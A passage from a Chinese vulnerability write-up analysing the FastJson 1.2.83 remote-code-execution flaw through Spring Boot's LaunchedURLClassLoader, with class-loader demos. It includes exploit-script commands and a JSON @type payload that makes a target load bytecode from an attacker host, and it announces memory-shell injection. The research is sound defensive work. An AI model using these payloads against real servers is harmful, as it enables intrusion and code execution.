# 手撕 FastJson 1.2.83 RCE 原理
> QIANXIN Team
> 来源：https://forum.butian.net/share/5001

## 前言

最近 FastJson 1.2.83 无 gadget RCE 的讨论热度很高, 在 AI 时代依旧手撕一波原理机制, 除了发现一些 java 方面的 trick 外, 按照个人习惯同样将漏洞链路中一些无关紧要的部分做一些研究, 以搭建知识壁垒. 由于 fastjson 的无条件 RCE 需要利用爆破 fd，最终的 sink 点同样是类加载，并且内存马契合实战攻防场景，因此在此给出内存马注入思路。

## ClassLoader 问题

### AppClassLoader

对于 AppClassLoader 不难理解, 在我们从 IDEA 进行运行一个 java 类时, IDEA 会先进行编译, 随后运行指定的 class 文件, 整个过程依赖于 classpath:

```php
java
-cp /Users/heihu577/Desktop/Code/JavaCode/fastjson-1.2.83-gadget-rce-main/fastjson-rce-springboot/target/classes:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-starter-web/2.7.18/spring-boot-starter-web-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-starter/2.7.18/spring-boot-starter-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot/2.7.18/spring-boot-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/2.7.18/spring-boot-autoconfigure-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-starter-logging/2.7.18/spring-boot-starter-logging-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-starter-json/2.7.18/spring-boot-starter-json-2.7.18.jar:/Users/heihu577/.m2/repository/org/springframework/spring-core/5.3.31/spring-core-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-jcl/5.3.31/spring-jcl-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-context/5.3.31/spring-context-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-aop/5.3.31/spring-aop-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-beans/5.3.31/spring-beans-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-expression/5.3.31/spring-expression-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-web/5.3.31/spring-web-5.3.31.jar:/Users/heihu577/.m2/repository/org/springframework/spring-webmvc/5.3.31/spring-webmvc-5.3.31.jar:/Users/heihu577/.m2/repository/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar:/Users/heihu577/.m2/repository/org/springframework/boot/spring-boot-starter-tomcat/2.7.18/spring-boot-starter-tomcat-2.7.18.jar:/Users/heihu577/.m2/repository/org/apache/tomcat/embed/tomcat-embed-core/9.0.83/tomcat-embed-core-9.0.83.jar:/Users/heihu577/.m2/repository/org/apache/tomcat/embed/tomcat-embed-el/9.0.83/tomcat-embed-el-9.0.83.jar:/Users/heihu577/.m2/repository/org/apache/tomcat/embed/tomcat-embed-websocket/9.0.83/tomcat-embed-websocket-9.0.83.jar:/Users/heihu577/.m2/repository/ch/qos/logback/logback-classic/1.2.12/logback-classic-1.2.12.jar:/Users/heihu577/.m2/repository/ch/qos/logback/logback-core/1.2.12/logback-core-1.2.12.jar:/Users/heihu577/.m2/repository/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar:/Users/heihu577/.m2/repository/org/apache/logging/log4j/log4j-to-slf4j/2.17.2/log4j-to-slf4j-2.17.2.jar:/Users/heihu577/.m2/repository/org/apache/logging/log4j/log4j-api/2.17.2/log4j-api-2.17.2.jar:/Users/heihu577/.m2/repository/org/slf4j/jul-to-slf4j/1.7.36/jul-to-slf4j-1.7.36.jar:/Users/heihu577/.m2/repository/jakarta/annotation/jakarta.annotation-api/1.3.5/jakarta.annotation-api-1.3.5.jar:/Users/heihu577/.m2/repository/org/yaml/snakeyaml/1.30/snakeyaml-1.30.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.13.5/jackson-databind-2.13.5.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.13.5/jackson-annotations-2.13.5.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.13.5/jackson-core-2.13.5.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jdk8/2.13.5/jackson-datatype-jdk8-2.13.5.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/datatype/jackson-datatype-jsr310/2.13.5/jackson-datatype-jsr310-2.13.5.jar:/Users/heihu577/.m2/repository/com/fasterxml/jackson/module/jackson-module-parameter-names/2.13.5/jackson-module-parameter-names-2.13.5.jar
com.vuln.fastjson.Application
```

上方代码分为两个部分: `-cp & 类名`, 很标准的 java 应用程序启动 main 方法案例, 而 SpringBoot 依赖的一些比如 jackson 类库也能够通过`-cp（-classpath）`进行引入, 因此这里使用正常的 AppClassLoader 并不会遇到类无法找到问题, 对于 SpringBoot 开发者来说自然而然也没有必要定义其他的 ClassLoader（因为默认就能跑）.

### LaunchedURLClassLoader

#### FatJar 说明

当我们使用:

```php
mvn -f pom.xml package -DskipTests
```

进行生成 jar 包之后, 使用 FatJar 的方式运行:

![image-20260722175108836.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-f296248162a78bef794e1d15cce81e858fb5df3e.png)

这里的 ClassLoader 变为了 LaunchedURLClassLoader, 对于该 ClassLoader 的说明: [https://juejin.cn/post/7320541744353083433](https://juejin.cn/post/7320541744353083433)

由于 SpringBoot 的 FatJar 把项目所有第三方依赖都打包到 BOOT-INF/lib/ 下作为嵌套 jar，而 Java 原生的 URLClassLoader 无法加载「jar 里的 jar」这种嵌套结构，所以 SpringBoot 自定义了 ClassLoader（3.2 之前是 LaunchedURLClassLoader，3.2+ 是 LaunchedClassLoader）来直接从嵌套 jar 的 zip 字节流中读取 class，让业务代码能正常使用这些依赖。

比如我们当前这个项目可以通过 unzip -l 进行查看:

```php
heihu577 @ ~/Desktop/Code/JavaCode/fastjson-1.2.83-gadget-rce-main/fastjson-rce-springboot/target ❯ unzip -l fastjson-rce-env-1.0.0_副本.jar 
Archive:  fastjson-rce-env-1.0.0_副本.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  07-22-2026 17:50   META-INF/
      455  07-22-2026 17:50   META-INF/MANIFEST.MF
        0  02-01-1980 00:00   org/
        0  02-01-1980 00:00   org/springframework/
        0  02-01-1980 00:00   org/springframework/boot/
        0  02-01-1980 00:00   org/springframework/boot/loader/
     5871  02-01-1980 00:00   org/springframework/boot/loader/ClassPathIndexFile.class
     7675  02-01-1980 00:00   org/springframework/boot/loader/ExecutableArchiveLauncher.class
     2551  02-01-1980 00:00   org/springframework/boot/loader/JarLauncher.class
     1483  02-01-1980 00:00   org/springframework/boot/loader/LaunchedURLClassLoader$DefinePackageCallType.class
     1535  02-01-1980 00:00   org/springframework/boot/loader/LaunchedURLClassLoader$UseFastConnectionExceptionsEnumeration.class
    11154  02-01-1980 00:00   org/springframework/boot/loader/LaunchedURLClassLoader.class
     5932  02-01-1980 00:00   org/springframework/boot/loader/Launcher.class
     1536  02-01-1980 00:00   org/springframework/boot/loader/MainMethodRunner.class
      266  02-01-1980 00:00   org/springframework/boot/loader/PropertiesLauncher$1.class
     1484  02-01-1980 00:00   org/springframework/boot/loader/PropertiesLauncher$ArchiveEntryFilter.class
     8128  02-01-1980 00:00   org/springframework/boot/loader/PropertiesLauncher$ClassPathArchives.class
     1953  02-01-1980 00:00   org/springframework/boot/loader/PropertiesLauncher$PrefixMatchingArchiveFilter.class
    18267  02-01-1980 00:00   org/springframework/boot/loader/PropertiesLauncher.class
     1728  02-01-1980 00:00   org/springframework/boot/loader/WarLauncher.class
        0  02-01-1980 00:00   org/springframework/boot/loader/archive/
      302  02-01-1980 00:00   org/springframework/boot/loader/archive/Archive$Entry.class
      511  02-01-1980 00:00   org/springframework/boot/loader/archive/Archive$EntryFilter.class
     4745  02-01-1980 00:00   org/springframework/boot/loader/archive/Archive.class
     6093  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive$AbstractIterator.class
     2180  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive$ArchiveIterator.class
     1857  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive$EntryIterator.class
     1269  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive$FileEntry.class
     2527  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive$SimpleJarFileArchive.class
     5346  02-01-1980 00:00   org/springframework/boot/loader/archive/ExplodedArchive.class
     2884  02-01-1980 00:00   org/springframework/boot/loader/archive/JarFileArchive$AbstractIterator.class
     1981  02-01-1980 00:00   org/springframework/boot/loader/archive/JarFileArchive$EntryIterator.class
     1081  02-01-1980 00:00   org/springframework/boot/loader/archive/JarFileArchive$JarFileEntry.class
     2528  02-01-1980 00:00   org/springframework/boot/loader/archive/JarFileArchive$NestedArchiveIterator.class
    10349  02-01-1980 00:00   org/springframework/boot/loader/archive/JarFileArchive.class
        0  02-01-1980 00:00   org/springframework/boot/loader/data/
      485  02-01-1980 00:00   org/springframework/boot/loader/data/RandomAccessData.class
      282  02-01-1980 00:00   org/springframework/boot/loader/data/RandomAccessDataFile$1.class
     2772  02-01-1980 00:00   org/springframework/boot/loader/data/RandomAccessDataFile$DataInputStream.class
     3259  02-01-1980 00:00   org/springframework/boot/loader/data/RandomAccessDataFile$FileAccess.class
     4015  02-01-1980 00:00   org/springframework/boot/loader/data/RandomAccessDataFile.class
        0  02-01-1980 00:00   org/springframework/boot/loader/jar/
     1438  02-01-1980 00:00   org/springframework/boot/loader/jar/AbstractJarFile$JarFileType.class
      878  02-01-1980 00:00   org/springframework/boot/loader/jar/AbstractJarFile.class
     4976  02-01-1980 00:00   org/springframework/boot/loader/jar/AsciiBytes.class
      616  02-01-1980 00:00   org/springframework/boot/loader/jar/Bytes.class
      295  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryEndRecord$1.class
     3319  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryEndRecord$Zip64End.class
     2029  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryEndRecord$Zip64Locator.class
     5029  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryEndRecord.class
     6897  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryFileHeader.class
     4624  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryParser.class
      540  02-01-1980 00:00   org/springframework/boot/loader/jar/CentralDirectoryVisitor.class
      345  02-01-1980 00:00   org/springframework/boot/loader/jar/FileHeader.class
    13641  02-01-1980 00:00   org/springframework/boot/loader/jar/Handler.class
     3885  02-01-1980 00:00   org/springframework/boot/loader/jar/JarEntry.class
     1458  02-01-1980 00:00   org/springframework/boot/loader/jar/JarEntryCertification.class
      299  02-01-1980 00:00   org/springframework/boot/loader/jar/JarEntryFilter.class
     2299  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFile$1.class
     1299  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFile$JarEntryEnumeration.class
    16660  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFile.class
     1368  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries$1.class
     2258  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries$EntryIterator.class
     1281  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries$Offsets.class
     1338  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries$Zip64Offsets.class
     1334  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries$ZipOffsets.class
    17280  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileEntries.class
     3512  02-01-1980 00:00   org/springframework/boot/loader/jar/JarFileWrapper.class
      702  02-01-1980 00:00   org/springframework/boot/loader/jar/JarURLConnection$1.class
     4302  02-01-1980 00:00   org/springframework/boot/loader/jar/JarURLConnection$JarEntryName.class
     9399  02-01-1980 00:00   org/springframework/boot/loader/jar/JarURLConnection.class
     3559  02-01-1980 00:00   org/springframework/boot/loader/jar/StringSequence.class
     1813  02-01-1980 00:00   org/springframework/boot/loader/jar/ZipInflaterInputStream.class
        0  02-01-1980 00:00   org/springframework/boot/loader/jarmode/
      293  02-01-1980 00:00   org/springframework/boot/loader/jarmode/JarMode.class
     2201  02-01-1980 00:00   org/springframework/boot/loader/jarmode/JarModeLauncher.class
     1292  02-01-1980 00:00   org/springframework/boot/loader/jarmode/TestJarMode.class
        0  02-01-1980 00:00   org/springframework/boot/loader/util/
     5174  02-01-1980 00:00   org/springframework/boot/loader/util/SystemPropertyUtils.class
        0  07-22-2026 17:50   BOOT-INF/
        0  07-22-2026 17:50   BOOT-INF/classes/
        0  07-22-2026 17:46   BOOT-INF/classes/com/
        0  07-22-2026 17:46   BOOT-INF/classes/com/vuln/
        0  07-22-2026 17:46   BOOT-INF/classes/com/vuln/fastjson/
        0  07-22-2026 17:50   META-INF/maven/
        0  07-22-2026 17:50   META-INF/maven/com.vuln/
        0  07-22-2026 17:50   META-INF/maven/com.vuln/fastjson-rce-env/
     4244  07-22-2026 17:50   BOOT-INF/classes/com/vuln/fastjson/ParseController.class
      723  07-22-2026 17:50   BOOT-INF/classes/com/vuln/fastjson/Application.class
       41  07-22-2026 17:46   BOOT-INF/classes/application.properties
     1537  07-22-2026 17:48   META-INF/maven/com.vuln/fastjson-rce-env/pom.xml
       59  07-22-2026 17:50   META-INF/maven/com.vuln/fastjson-rce-env/pom.properties
        0  07-22-2026 17:50   BOOT-INF/lib/
   128154  11-23-2023 07:16   BOOT-INF/lib/spring-boot-loader-2.7.18.jar
  1466652  11-23-2023 07:16   BOOT-INF/lib/spring-boot-2.7.18.jar
  1691093  11-23-2023 07:16   BOOT-INF/lib/spring-boot-autoconfigure-2.7.18.jar
   231811  03-23-2023 21:02   BOOT-INF/lib/logback-classic-1.2.12.jar
   448860  03-23-2023 21:02   BOOT-INF/lib/logback-core-1.2.12.jar
    41125  02-08-2022 13:31   BOOT-INF/lib/slf4j-api-1.7.36.jar
    18010  02-23-2022 13:30   BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar
   302511  02-23-2022 13:28   BOOT-INF/lib/log4j-api-2.17.2.jar
     4519  02-08-2022 13:31   BOOT-INF/lib/jul-to-slf4j-1.7.36.jar
    25058  08-02-2019 11:08   BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar
  1489305  02-01-1980 00:00   BOOT-INF/lib/spring-core-5.3.31.jar
    25161  11-16-2023 08:01   BOOT-INF/lib/spring-jcl-5.3.31.jar
   331605  12-14-2021 18:31   BOOT-INF/lib/snakeyaml-1.30.jar
  1537543  01-23-2023 00:47   BOOT-INF/lib/jackson-databind-2.13.5.jar
    75718  01-23-2023 00:03   BOOT-INF/lib/jackson-annotations-2.13.5.jar
   375186  01-23-2023 00:23   BOOT-INF/lib/jackson-core-2.13.5.jar
    34800  01-23-2023 01:26   BOOT-INF/lib/jackson-datatype-jdk8-2.13.5.jar
   121206  01-23-2023 01:26   BOOT-INF/lib/jackson-datatype-jsr310-2.13.5.jar
     9513  01-23-2023 01:26   BOOT-INF/lib/jackson-module-parameter-names-2.13.5.jar
  3546550  11-09-2023 20:57   BOOT-INF/lib/tomcat-embed-core-9.0.83.jar
   258314  11-09-2023 20:57   BOOT-INF/lib/tomcat-embed-el-9.0.83.jar
   283325  11-09-2023 20:57   BOOT-INF/lib/tomcat-embed-websocket-9.0.83.jar
  1642676  11-16-2023 08:02   BOOT-INF/lib/spring-web-5.3.31.jar
   706400  11-16-2023 08:02   BOOT-INF/lib/spring-beans-5.3.31.jar
  1029974  11-16-2023 08:03   BOOT-INF/lib/spring-webmvc-5.3.31.jar
   384535  11-16-2023 08:02   BOOT-INF/lib/spring-aop-5.3.31.jar
  1275645  11-16-2023 08:02   BOOT-INF/lib/spring-context-5.3.31.jar
   293174  11-16-2023 08:02   BOOT-INF/lib/spring-expression-5.3.31.jar
   671701  05-23-2022 00:59   BOOT-INF/lib/fastjson-1.2.83.jar
    29514  02-01-1980 00:00   BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.18.jar
     1333  07-22-2026 17:50   BOOT-INF/classpath.idx
      212  07-22-2026 17:50   BOOT-INF/layers.idx
```

通过上方案例我们可以看到我们实际的业务代码量其实很少, 大部分引入的也都是一些其他第三方依赖, 通过归类的话可以归类为如下结果:

```php
META-INF/ （SpringBoot FatJar 元数据目录）
├── META-INF/MANIFEST.MF （Jar 清单文件，指定 Main-Class 为 JarLauncher）

org/ （SpringBoot Loader 启动引导层）
└── org/springframework/boot/loader/
    ├── ClassPathIndexFile.class （SpringBoot 启动需要）
    ├── ExecutableArchiveLauncher.class （SpringBoot 启动需要）
    ├── JarLauncher.class （SpringBoot 启动需要，主入口）
    ├── LaunchedURLClassLoader.class （SpringBoot 启动需要，自定义 ClassLoader 核心）
    ├── Launcher.class （SpringBoot 启动需要，启动器抽象类）
    ├── MainMethodRunner.class （SpringBoot 启动需要，执行主方法）
    ├── PropertiesLauncher.class （SpringBoot 启动需要）
    ├── WarLauncher.class （SpringBoot 启动需要）
    ├── archive/ （Archive 抽象，支持 Jar/Exploded 读取）
    │   ├── Archive.class
    │   ├── ExplodedArchive.class
    │   └── JarFileArchive.class
    ├── data/ （随机访问文件数据层）
    │   └── RandomAccessDataFile.class
    ├── jar/ （JarFile 解析器，支持嵌套 Jar 读取）
    │   ├── Handler.class （URLStreamHandler，处理 jar: 协议）
    │   ├── JarFile.class
    │   ├── JarEntry.class
    │   ├── JarURLConnection.class
    │   └── ...
    ├── jarmode/ （Jar 运行模式，如 layertools）
    │   ├── JarMode.class
    │   └── JarModeLauncher.class
    └── util/ （工具类）
        └── SystemPropertyUtils.class

BOOT-INF/ （业务代码和依赖存放目录）
├── BOOT-INF/classes/ （业务代码编译后的 class 文件）
│   ├── com/vuln/fastjson/
│   │   ├── Application.class （开发者自定义，@SpringBootApplication 启动类）
│   │   └── ParseController.class （开发者自定义，@RestController 控制器）
│   └── application.properties （开发者自定义，SpringBoot 配置文件）
├── BOOT-INF/lib/ （所有第三方依赖 Jar，共 30 个）
│   ├── spring-boot-2.7.18.jar （SpringBoot 核心）
│   ├── spring-boot-autoconfigure-2.7.18.jar （SpringBoot 自动配置）
│   ├── spring-core-5.3.31.jar （Spring 框架核心）
│   ├── spring-context-5.3.31.jar （Spring IoC 容器）
│   ├── spring-beans-5.3.31.jar （Spring Bean 工厂）
│   ├── spring-aop-5.3.31.jar （Spring AOP 支持）
│   ├── spring-web-5.3.31.jar （Spring Web 支持）
│   ├── spring-webmvc-5.3.31.jar （Spring MVC）
│   ├── tomcat-embed-core-9.0.83.jar （嵌入式 Tomcat 容器）
│   ├── tomcat-embed-el-9.0.83.jar （Tomcat EL 表达式）
│   ├── tomcat-embed-websocket-9.0.83.jar （Tomcat WebSocket）
│   ├── jackson-databind-2.13.5.jar （Jackson JSON 序列化）
│   ├── logback-classic-1.2.12.jar （Logback 日志实现）
│   ├── fastjson-1.2.83.jar （显式引入的 Fastjson 依赖）
│   └── ... （其他 SpringBoot 传递依赖）
├── BOOT-INF/classpath.idx （Classpath 索引文件）
└── BOOT-INF/layers.idx （Docker 分层索引文件）

META-INF/maven/ （Maven 构建元数据）
└── META-INF/maven/com.vuln/fastjson-rce-env/
    ├── pom.xml （项目 POM 文件）
    └── pom.properties （Maven 属性）
```

另外如果你学习过 jar 的知识的话:

![image-20260722222245647.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-91d11d31920e5485157815ae756f5f22c842e684.png)

#### 动态调试 JarLauncher

##### 调试思路

由于 SpringBoot 在 FatJar 中才会应用到`JarLauncher`, 因此我们只能通过远程调试来观察到这一过程, 另外我们需要引入 Maven 依赖:

```php
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-loader</artifactId>
</dependency>
```

并且启动已经编译好的 FatJar 时使用远程参数:

```php
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 -jar fastjson-rce-env-1.0.0.jar
```

断点打到`JarLauncher::main`方法中:

![image-20260722222936889.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-eebea4ce7e8662c52685664bd584478816be650a.png)

##### 筛选 BOOT-INF 目录生成 Iterator

这里会实例化自己本身, 随后调用到`launch`方法中, 跟进:

![xw_20260725200347.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ac2dff22add92d454a89a1ad7f1b54a94e57ed7d.png)

这里我们可以看到, 最终会返回一个 Iterator 迭代器, 该迭代器根据 FatJar 中的`BOOT-INF`下的目录信息值能够通过依次调用 next 方法进行依次取出. 该 Iterator 保存: `classes/ 目录 + lib/*.jar 文件`.

##### 创建 LaunchedURLClassLoader

![image-20260722230608609.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-782a3c63505ac9c001abcb359ecad9c0fdd035b2.png)

从这里我们已经能够看到`LaunchedURLClassLoader`的身影了, 创建过程:

![image-20260722231644342.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-097ae25120177d50918bb786ec161fdd879dfc05.png)

这里创建完毕`LaunchedURLClassLoader`之后, 会来获取`MANIFEST.MF 文件中的 Start-Class`, 随后调用`launch`方法进入启动类逻辑:

![image-20260722232349555.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c9d76789187b6838e588f5e5d108498c16c4011f.png)

原因是以 @SpringBootApplication 注解修饰的类, 在打包时会设置 MANIFEST.MF 文件的 Start-Class 键的值.

#### LaunchedURLClassLoader 含义

首先我们对 FatJar 进行资源查找:

```java
package com.vuln.fastjson;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Test {
    public static void main(String[] args) throws Exception {
        
        
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
                new URL("jar:file:/Users/heihu577/Desktop/Code/JavaCode/fastjson-1.2.83-gadget-rce-main/fastjson-rce-springboot/target/fastjson-rce-env-1.0.0.jar!/BOOT-INF/lib/fastjson-1.2.83.jar!/")
        });






        
        InputStream resourceAsStream = urlClassLoader.getResourceAsStream("META-INF/MANIFEST.MF");

        if (resourceAsStream != null) {
            System.out.println("✅ 找到 MANIFEST.MF");
            BufferedReader reader = new BufferedReader(new InputStreamReader(resourceAsStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } else {
            System.out.println("❌ 未找到 MANIFEST.MF");
        }

        
        try {
            Class<?> clazz = urlClassLoader.loadClass("com.alibaba.fastjson.JSON");
            System.out.println("✅ 成功加载类: " + clazz.getName());
            System.out.println("   ClassLoader: " + clazz.getClassLoader());
        } catch (ClassNotFoundException e) {
            System.out.println("❌ 未找到类: com.alibaba.fastjson.JSON");
            e.printStackTrace();
        }
    }
}
```

上述案例结果:

```php
✅ 找到 MANIFEST.MF
Manifest-Version: 1.0
Created-By: 1.7.0_07 (Oracle Corporation)

❌ 未找到类: com.alibaba.fastjson.JSON
java.lang.ClassNotFoundException: com.alibaba.fastjson.JSON
    at java.net.URLClassLoader.findClass(URLClassLoader.java:382)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:424)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
    at com.vuln.fastjson.Test.main(Test.java:42)
```

> 上述 MANIFEST.MF 能够找到是因为找到了 ClassLoader 中其他类的 MANIFEST.MF, 例如: jar:file:/Users/heihu577/Library/Caches/JetBrains/IntelliJIdea2025.3/captureAgent/debugger-agent.jar!/META-INF/MANIFEST.MF

可以看到, 资源可以通过 jar 协议中的双`!/`的姿势找到资源（这里能够找到实际上是因为**getResourceAsStream**同样遵循双亲委派机制）, 但类却无法找到, 若想要成功找到类, 则需要使用`JarFile.registerUrlProtocolHandler();`进行注册, 完整案例:

```java
package com.vuln.fastjson;

import org.springframework.boot.loader.jar.JarFile;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Test {
    public static void main(String[] args) throws Exception {
         JarFile.registerUrlProtocolHandler(); 
        
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
                new URL("jar:file:/Users/heihu577/Desktop/Code/JavaCode/fastjson-1.2.83-gadget-rce-main/fastjson-rce-springboot/target/fastjson-rce-env-1.0.0.jar!/BOOT-INF/lib/fastjson-1.2.83.jar!/")
        });

        
        InputStream resourceAsStream = urlClassLoader.getResourceAsStream("META-INF/MANIFEST.MF");

        if (resourceAsStream != null) {
            System.out.println("✅ 找到 MANIFEST.MF");
            BufferedReader reader = new BufferedReader(new InputStreamReader(resourceAsStream));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } else {
            System.out.println("❌ 未找到 MANIFEST.MF");
        }

        
        try {
            Class<?> clazz = urlClassLoader.loadClass("com.alibaba.fastjson.JSON");
            System.out.println("✅ 成功加载类: " + clazz.getName());
            System.out.println("   ClassLoader: " + clazz.getClassLoader());
        } catch (ClassNotFoundException e) {
            System.out.println("❌ 未找到类: com.alibaba.fastjson.JSON");
            e.printStackTrace();
        }
    }
}
```

该方法在`筛选 BOOT-INF 目录生成 Iterator`中截图有说明了, 在这里我们看一下效果.

## 漏洞复现 & 分析（http 协议 & JDK8）

### 复现过程

这里很简单, 直接使用 GitHub 上封装好的脚本即可. 先使用`scripts/build.sh 127.0.0.1 19090 id-oob jdk8-http`进行生成生成字节码文件, 随后使用`python3 exploit.py 127.0.0.1 19090 http://localhost:18080/ /parse --mode jdk8-http`来进行攻击目标 fastjson 站点, 如图:

![image-20260722235522750.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-054eeb99e0841a28c141832fd02bf0fa2633f9b6.png)

这里手动的 Payload 可以为:

```php
{"@type": "http:..2130706433:2333.d"}
```

需要准备`http:..2130706433:2333.d`这种类的字节码挂在攻击机上.

### 漏洞分析

漏洞形成原理很简单, 锁定在`ParserConfig::checkAutoType`方法中:

![image-20260723000637132.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c8115b15a2233804ae787d5930fedd4e63d3a579.png)

> 图中标明的`调用 loadClass 加载类到内存`标错了, 应该说明为: `调用 loadClass 查找类资源`.

这里无论是否开启了`autoType`, 由于判断分支中存在`@JSONType`注解, 导致能够成功进入到分支中. 这里着重说一下`LaunchedURLClassLoader`, 该类在 loadClass 时若会发送 HTTP 请求:

![image-20260724130846063.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-317356bb4964b07efb8650a61480784921447906.png)

具体原因看下方分析.

#### 漏洞本质 & URLClassLoader trick【loadClass & getResourceAsStream】

很简单, 下方代码能够发送 HTTP 请求:

```java
URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{
        new URL("jar:http://127.0.0.1:2333/a.jar!/"),
},Test.class.getClassLoader());

urlClassLoader.loadClass("com.heihu577.hahaha");
```

当然, 在查找资源时同样能够发送请求, 仅限于明确了 URL 的情况（URLClassLoader 有传值）:

```java
package com.vuln.fastjson;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = Test.class.getClassLoader(); 
        classLoader = new URLClassLoader(new URL[]{
                new URL("jar:http://127.0.0.1:2333/a.jar!/"),
        },classLoader); 

        InputStream resourceAsStream = classLoader.getResourceAsStream("asdf");
    }
}
```

上述两个案例从正常开发角度不难理解, 本质就是要通过`jar:http://`远程中拉取资源的. 但单纯 AppClassLoader 却不会发送请求, 直接返回 NULL:

![image-20260723002439936.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-e177cd3d2b6b333c474d057acfe405e557f382e9.png)

这也不难理解, 因为 AppClassLoader 中的 classpath 本身就是本地资源. 那既然 URLClassLoader 能远程获取资源, 那么我们看一下下方这个案例:

```java
package com.vuln.fastjson;

import org.springframework.boot.loader.LaunchedURLClassLoader;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = Test.class.getClassLoader(); 
        classLoader = new LaunchedURLClassLoader(new URL[]{},classLoader);
        InputStream resourceAsStream = classLoader.getResourceAsStream("jar:http://127.0.0.1:2333/a.jar!/123");
        System.out.println(resourceAsStream);
    }
}
```

该案例并不会发送任何 HTTP 请求, 那怎么样才能发送 HTTP 请求呢？存在如下 DEMO:

```java
package com.vuln.fastjson;

import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = Test.class.getClassLoader(); 
        classLoader = new URLClassLoader(new URL[]{new URL("http://www.baidu.com/")},classLoader);
        InputStream resourceAsStream = classLoader.getResourceAsStream("jar:http://127.0.0.1:2333/a.jar!/123");
        System.out.println(resourceAsStream);
    }
}
```

只需要将 URLClassLoader 中初始化一个`http`协议的任意服务器, 那么在`getResourceAsStream`时就能发送远程资源, 为什么会这样？原因在 URLClassLoader 的拼接:

![image-20260723010559894.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-2458e5dd42543b1f44813bc70e703292332148c9.png)

除了`getResourceAsStream`方法能够发送 HTTP 请求, 更重要的是 loadClass 同样会发送请求:

```java
package com.vuln.fastjson;

import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = Test.class.getClassLoader(); 
        classLoader = new URLClassLoader(new URL[]{new URL("http://www.baidu.com/")},classLoader);
        classLoader.loadClass("http:..2130706433:2333.a"); 
